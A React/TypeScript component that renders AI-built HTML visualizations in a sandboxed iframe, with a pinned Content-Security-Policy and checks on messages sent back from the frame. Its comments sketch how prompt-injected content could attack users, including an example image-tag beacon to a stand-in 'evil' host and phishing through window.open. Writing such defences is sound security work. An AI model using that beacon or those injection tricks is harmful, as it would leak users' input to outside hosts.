'use client';

// app/chat/components/HtmlFrame.tsx
//
// Sandboxed renderer for AI-built HTML visualizations. The document goes in
// via srcDoc, which inherits the PARENT origin — so `allow-same-origin` must
// never be added to the sandbox list: without it the frame runs on an opaque
// origin with no access to the app's cookies, storage or DOM. A CSP meta tag
// is injected into the document so scripts/styles/fonts can only load from
// the CDN whitelist the model is instructed to use.

import React, { useEffect, useRef, useState } from 'react';

// Mirrors the CDN whitelist in the createVisualization prompt guidance
// (app/api/chat/tools/VisualizationTool.ts). form-action/base-uri do NOT
// fall back to default-src, so they are pinned explicitly — without them,
// allow-forms-style tricks or an injected <base> could point the document at
// an external origin.
const FRAME_CSP = [
  "default-src 'none'",
  "script-src 'unsafe-inline' https://esm.sh https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com",
  "style-src 'unsafe-inline' https://esm.sh https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com https://fonts.googleapis.com",
  'font-src data: https://fonts.gstatic.com https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com',
  // img-src is pinned to the CDN whitelist (not `https:`) on purpose: a wide
  // img-src is a data-exfil channel — a prompt-injected document could beacon
  // whatever the user types into the widget out via <img src="https://evil/?d=…">
  // even though connect-src blocks fetch/XHR. Inline data:/blob: covers real
  // chart images; remote images only from the same CDNs as scripts/styles.
  'img-src data: blob: https://esm.sh https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com',
  'connect-src https://esm.sh https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com',
  'media-src data: blob:',
  "form-action 'none'",
  "base-uri 'none'"
].join('; ');

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${FRAME_CSP}">`;

// Error bridge: the sandbox surfaces no errors to anyone by default — a
// broken visualization just renders half-dead. This reporter (injected next
// to the CSP meta, so it parses before the model's scripts) forwards the
// first few runtime errors to the parent via postMessage. targetOrigin is
// '*' because a sandboxed srcDoc frame has an opaque origin; the payload is
// only the AI's own error text, nothing sensitive. The parent side validates
// event.source instead (see below).
const REPORTER_SCRIPT = `<script>(function(){var sent=0;function report(message){if(sent>=3)return;sent+=1;try{parent.postMessage({__htmlFrameError:String(message).slice(0,600)},'*');}catch(e){}}window.addEventListener('error',function(e){report((e&&e.message)||'Unknown script error');});window.addEventListener('unhandledrejection',function(e){var r=e&&e.reason;report((r&&(r.message||r))||'Unhandled promise rejection');});})();</script>`;

// The document posts its actual height ONCE at load (the parent cannot
// measure an opaque-origin frame). Only once: repeated reporting becomes a
// growth loop on 100vh documents, and late adjustments shift the page while
// the user is reading. Must never mutate the document's layout.
const FIT_SCRIPT = `<script>(function(){function post(){requestAnimationFrame(function(){var h=Math.ceil(Math.max(document.documentElement.scrollHeight,document.body?document.body.scrollHeight:0));try{parent.postMessage({__htmlFrameSize:{height:h}},'*');}catch(e){}});}
if(document.readyState==='complete'){post();}else{window.addEventListener('load',post);}})();</script>`;

// Inject the CSP meta as early as possible in the model's document. A meta
// CSP only governs what parses AFTER it, so the anchor must sit before the
// first <script> — preferred anchors in order: after <head>, after <html>,
// start of the document (browsers hoist stray leading metas into the head
// they synthesize). An anchor that would land past a script (malformed
// documents like <html><script>…</script><head>) is rejected.
function withFrameCsp(html: string): string {
  const firstScript = html.search(/<script\b/i);
  const anchorAfter = (re: RegExp): number => {
    const match = html.match(re);
    if (!match || match.index === undefined) return -1;
    const at = match.index + match[0].length;
    return firstScript !== -1 && at > firstScript ? -1 : at;
  };
  const headAt = anchorAfter(/<head[^>]*>/i);
  const insertAt =
    headAt !== -1 ? headAt : Math.max(anchorAfter(/<html[^>]*>/i), 0);
  return (
    html.slice(0, insertAt) +
    CSP_META +
    REPORTER_SCRIPT +
    FIT_SCRIPT +
    html.slice(insertAt)
  );
}

const MIN_CONTENT_HEIGHT = 160;
const MAX_CONTENT_HEIGHT = 1200;

interface HtmlFrameProps {
  html: string;
  title: string;
  /** Fixed pixel height (inline cards); omit to fill the parent (panel). */
  height?: number;
  className?: string;
  /** First runtime errors reported by the document (max 3, ≤600 chars). */
  onRuntimeError?: (message: string) => void;
}

export const HtmlFrame: React.FC<HtmlFrameProps> = ({
  html,
  title,
  height,
  className,
  onRuntimeError
}) => {
  const frameRef = useRef<HTMLIFrameElement>(null);

  // The document must only load once the frame has a stable width > 0. When
  // the panel opens on a restored conversation, the frame mounts while the
  // <aside> is still w-0 and animating to 45% — loading the document there
  // lays it out (and initializes Chart.js & co.) on garbage measurements
  // that never fully correct themselves, and FIT_SCRIPT's one-shot
  // measurement hits the wrong layout.
  const [docReady, setDocReady] = useState(false);
  useEffect(() => {
    const frame = frameRef.current;
    if (!frame) return;
    let timer: ReturnType<typeof setTimeout> | undefined;
    const observer = new ResizeObserver(() => {
      if (timer) clearTimeout(timer);
      if (frame.getBoundingClientRect().width < 1) return;
      // Unchanged width for 150 ms = the open animation (300 ms) is done.
      timer = setTimeout(() => setDocReady(true), 150);
    });
    observer.observe(frame);
    return () => {
      observer.disconnect();
      if (timer) clearTimeout(timer);
    };
  }, []);

  // Content height from FIT_SCRIPT (inline mode only); reset when a new
  // version of the document arrives.
  const [reportedHeight, setReportedHeight] = useState<number | null>(null);
  const [prevHtml, setPrevHtml] = useState(html);
  if (prevHtml !== html) {
    setPrevHtml(html);
    setReportedHeight(null);
  }

  // The reporter posts from an opaque origin, so the ONLY trustworthy check
  // is that the message came from this exact frame's contentWindow — never
  // act on the payload of arbitrary window messages.
  useEffect(() => {
    const listener = (event: MessageEvent) => {
      if (!frameRef.current || event.source !== frameRef.current.contentWindow)
        return;
      const data = event.data as {
        __htmlFrameError?: unknown;
        __htmlFrameSize?: { height?: unknown };
      } | null;
      const message = data?.__htmlFrameError;
      if (typeof message === 'string' && message && onRuntimeError) {
        onRuntimeError(message);
      }
      const sizeHeight = data?.__htmlFrameSize?.height;
      if (typeof sizeHeight === 'number' && Number.isFinite(sizeHeight)) {
        setReportedHeight(
          (prev) =>
            prev ??
            Math.min(
              MAX_CONTENT_HEIGHT,
              Math.max(MIN_CONTENT_HEIGHT, Math.round(sizeHeight))
            )
        );
      }
    };
    window.addEventListener('message', listener);
    return () => window.removeEventListener('message', listener);
  }, [onRuntimeError]);

  // Inline: the measured height wins over the model's guess. Panel: always 100%.
  const effectiveHeight = height ? (reportedHeight ?? height) : undefined;

  // Sandbox: no allow-same-origin (srcDoc inherits the app origin), no
  // allow-popups/-to-escape-sandbox (window.open to arbitrary URLs is a
  // phishing vector for prompt-injected content), no allow-forms (inputs +
  // JS work without it; form submission could navigate the frame away).
  return (
    <iframe
      ref={frameRef}
      srcDoc={docReady ? withFrameCsp(html) : undefined}
      title={title}
      sandbox="allow-scripts allow-modals"
      allow="fullscreen"
      allowFullScreen
      referrerPolicy="no-referrer"
      // Not loading="lazy": lazy frames load on scroll, so the height
      // adjustment would land mid-read and shift the page.
      className={`w-full border-0 bg-white ${className ?? ''}`}
      style={effectiveHeight ? { height: effectiveHeight } : { height: '100%' }}
    />
  );
};
